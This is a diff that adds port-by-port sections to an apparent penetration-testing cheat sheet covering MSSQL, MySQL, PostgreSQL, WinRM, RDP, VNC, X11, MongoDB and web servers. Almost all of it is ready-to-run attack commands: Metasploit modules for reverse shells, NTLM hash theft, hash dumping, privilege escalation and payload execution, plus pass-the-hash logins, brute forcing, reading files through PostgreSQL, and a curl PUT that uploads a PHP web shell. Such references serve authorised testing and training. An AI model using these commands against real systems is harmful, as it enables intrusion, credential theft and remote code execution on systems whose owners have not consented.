@@ -26,6 +26,20 @@ CONTENT
   * [Port 513 - Rlogin](#Port-513---Rlogin)
   * [Port 514 - RSH](#Port-514---RSH)
   * [Port 515 - line printerdaemon LPD](#Port-515---line-printerdaemon-LPD)
+  * [Port 623 UDP/TCP - IPMI](#Port-623-UDP-TCP---IPMI)
+  * [Port 873 - RSYNC](#Port-873---RSYNC)
+  * [Port 1028 1099 - JAVA RMI](#Port-1028-1099---JAVA-RMI)
+  * [Port 1433 - MSSQL](#Port-1433---MSSQL)
+  * [Port 1521 - ORACLE](#Port-1521---ORACLE)
+  * [Port 3306 - MYSQL](#Port-3306---MYSQL)
+  * [Port 3389 - RDP](#Port-3389---RDP)
+  * [PORT 5432 5433 - POSTGRESQL](#PORT-5432-5433---POSTGRESQL)
+  * [Port 6985 5986 - WINRM](#Port-6985-5986---WINRM)
+  * [Port 5800 5801 5900 5901 - VNC](#Port-5800-5801-5900-590---VNC)
+  * [Port 5984 - CouchDB](#Port-5984---CouchDB )
+  * [Port 6000 -X11](#Port-6000---X11)
+  * [Port 27017 27018 - MONGO DB](#Port-27017-27018---MONGO-DB)
+  * [Port 80 - WEB SERVER](#Port-80---WEB-SERVER)
 
 # RECON
 ```bash
@@ -456,5 +470,279 @@ rsh domain\\user@$ip <Command>
 ```bash
 # The lpdprint tool included in PRET is a minimalist way to print data directly to an LPD capable printer as shown below:
 lpdprint.py hostname filename
+```
+## Port 623 UDP TCP - IPMI
+```bash
+#Enumeration
+nmap -n -p 623 10.0.0./24
+nmap -n -sU -p 623 10.0.0./24
+msf > use auxilary/scanner/ipmi/ipmi_version
+
+#version
+msf > use auxilary/scanner/ipmi/ipmi_version
+```
+
+## Port 873 - RSYNC
+```bash
+#Enumeration
+nc -vn 127.0.0.1 873
+(UNKNOWN) [127.0.0.1] 873 (rsync) open
+@RSYNCD: 31.0        <--- You receive this banner with the version 
+@RSYNCD: 31.0        <--- Then you send the same info
+# list                <--- Then you ask the sever to list
+raidroot             <--- The server starts enumerating
+USBCopy
+NAS_Public
+_NAS_Recycle_TOSRAID    <--- Enumeration finished
+@RSYNCD: EXIT         <--- Sever closes the connection
+
+nmap -sV --script "rsync-list-modules" -p 873 $IP
+msf> use auxiliary/scanner/rsync/modules_list
+
+#Example using IPv6 and a different port
+rsync -av --list-only rsync://[$IPv6]:8730
+
+# manual
+rsync -av --list-only rsync://$IP/shared_name
+```
+
+## Port 1028 1099 - JAVA RMI
+```bash
+#Enumeration
+
+# Basically this service could allow you to execute code.
+msf > use auxiliary/scanner/misc/java_rmi_server
+msf > use auxiliary/gather/java_rmi_registry
+nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p 1028 $IP
+
+# Reverse Shell
+msf > use exploit/multi/browser/java_rmi_connection_impl
+```
+## Port 1433 - MSSQL
+```bash
+# infomation 
+
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
+msf> use auxiliary/scanner/mssql/mssql_ping
+
+nmap -p 1433 -sU --script=ms-sql-info.nse $IP
+sqsh -S $IP -U <Username> -P <Password> -D <Database>
+
+#msfconsole
+#Steal NTLM
+msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder
+
+#Info gathering
+msf> use admin/mssql/mssql_enum #Security checks
+msf> use admin/mssql/mssql_enum_domain_accounts
+msf> use admin/mssql/mssql_enum_sql_logins
+msf> use auxiliary/admin/mssql/mssql_findandsampledata
+msf> use auxiliary/scanner/mssql/mssql_hashdump
+msf> use auxiliary/scanner/mssql/mssql_schemadump
+
+#Search for insteresting data
+msf> use auxiliary/admin/mssql/mssql_findandsampledata
+msf> use auxiliary/admin/mssql/mssql_idf
+
+#Privesc
+msf> use exploit/windows/mssql/mssql_linkcrawler
+msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
+msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin
+
+#Code execution
+msf> use admin/mssql/mssql_exec #Execute commands
+msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
+
+#Add new admin user from meterpreter session
+msf> use windows/manage/mssql_local_auth_bypass
+```
+## Port 1521 - ORACLE
+```bash
+oscanner -s $IP -P 1521
+tnscmd10g version -h $IP
+tnscmd10g status -h $IP
+nmap -p 1521 -A $IP
+nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
+
+#msfconsole
+msf > use auxiliary/admin/oracle
+msf > use auxiliary/scanner/oracle
+```
+## Port 3306 - MYSQL
+```bash
+nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP
+msf> use auxiliary/scanner/mysql/mysql_version
+msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump
+msf> use auxiliary/scanner/mysql/mysql_hashdump 
+msf> use auxiliary/admin/mysql/mysql_enum 
+msf> use auxiliary/scanner/mysql/mysql_schemadump 
+
+#Exploit
+msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows,
+
+# Connect Remote
+mysql -h <Hostname> -u root
+mysql -h <Hostname> -u root@localhost
+```
+## Port 3389 - RDP
+```bash
+# enumeration
+nmap -p 3389 --script=rdp-vuln-ms12-020.nse $IP
+nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $IP
+
+# Connect with known credetials
+rdesktop -u <username> $IP
+rdesktop -d <domain> -u <username> -p <password> $IP
+xfreerdp /u:[domain\]<username> /p:<password> /v:$IPP
+xfreerdp /u:[domain\]<username> /pth:<hash> /v:$IP
+
+# Check known credentials
+rdp_check <domain>\<name>:<password>@$IP
+```
+## PORT 5432 5433 - POSTGRESQL
+```bash
+# Connect
+psql -U <myuser> # Open psql console with user
+
+# Remote connection
+psql -h $IP -U <username> -d <database>
+psql -h $IP -p <port> -U <username> -W <password> <database>
+
+psql -h localhost -d <database_name> -U <User> 
+\list # List databases
+\c <database> # use the database
+\d # List tables
+
+#To read a file:
+CREATE TABLE demo(t text);
+COPY demo from '[FILENAME]';
+SELECT * FROM demo;
+
+# Enumeration
+msf> use auxiliary/scanner/postgres/postgres_version
+msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
+```
+## Port 6985 5986 - WINRM
+
+5985/tcp (http) 5986/tcp (https)
+```bash
+gem install evil-winrm
+evil-winrm -i $ip -u Administrator -p 'password'
+
+#pass the hash with evil-winrm
+evil-winrm -i $ip -u Administrator -H 'hash-pass'
+
+#msfconsole
+msf > use auxiliary/scanner/winrm/winrm_login
+#Bruteforce
+msf > use auxiliary/scanner/winrm/winrm_login
+#Run Commands
+msf > use auxiliary/scanner/winrm/winrm_cmd
+#Get a Shells
+msf > use exploit/windows/winrm/winrm_script_exec
+```
+## Port 5800 5801 5900 5901 - VNC
+```bash
+#Enumeration
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> $IP
+msf> use auxiliary/scanner/vnc/vnc_none_auth
+
+#connect
+vncviewer [-passwd passwd.txt] $IP::5901
+```
+
+## Port 5984 - CouchDB 
+```bash
+# Enumeration
+nmap -sV --script couchdb-databases,couchdb-stats -p 5984 $IP
+msf> use auxiliary/scanner/couchdb/couchdb_enum
+
+curl http://IP:5984/
+```
+## Port 6000 - X11
+```bash 
+# Enumeration
+nmap -sV --script x11-access -p 6000 $IP
+msf> use auxiliary/scanner/x11/open_x11
+
+# Remote Desktop View Way from:
+https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref
+
+# Get Shell
+msf> use exploit/unix/x11/x11_keyboard_exec
+```
+
+## Port 27017 27018 - MONGO DB
+```bash
+# MongoDB commnads:
+show dbs
+use <db>
+show collections
+db.<collection>.find()  #Dump the collection
+db.<collection>.count() #Number of records of the collection
+db.current.find({"username":"admin"})  #Find in current db the username admin
+
+# Automatic
+nmap -sV --script "mongo* and default" -p 27017 $IP
+
+# Login
+mongo $IP
+mongo $IP:<PORT>
+mongo $IP:<PORT>/<DB>
+mongo <database> -u <username> -p '<password>'
+
+nmap -n -sV --script mongodb-brute -p 27017 $IP
+```
+## Port 80 - WEB SERVER
+```bash
+# Server Version (Vulnerable?)
+whatweb -a 1 <URL> 
+webtech -u <URL>
+
+# Nikto
+nikto -h http://$ip
+
+# CMS Explorer
+cms-explorer -url http://$IP -type [Drupal, WordPress, Joomla, Mambo]
+
+# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
+wpscan --url http://$IP
+wpscan --url http://$IP --enumerate vp
+wpscan --url http://$IP --enumerate vt
+wpscan --url http://$IP --enumerate u
+wpscan -e --url https://url.com
+
+# Enum User:
+
+for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}';done
+
+# Joomscan
+joomscan -u  http://$IP
+joomscan -u  http://$IP --enumerate-components
+
+# Get header
+curl -i $IP
+
+# Get options
+curl -i -X OPTIONS $IP
+
+# Get everything
+curl -i -L $IP
+curl -i -H "User-Agent:Mozilla/4.0" http://$IP:8080
+
+# Check for title and all links
+curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+
+# Look at page with just text
+curl $IP -s -L | html2text -width '99' | uniq
+
+# Check if it is possible to upload
+curl -v -X OPTIONS http://$IP/
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php
+
+# Simple curl POST request with login data
+curl -X POST http://$IP/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'
+
+curl -s  http://$IP/fileRead.php -d 'file=fileRead.php' | jq -r ."file"
 ```
 
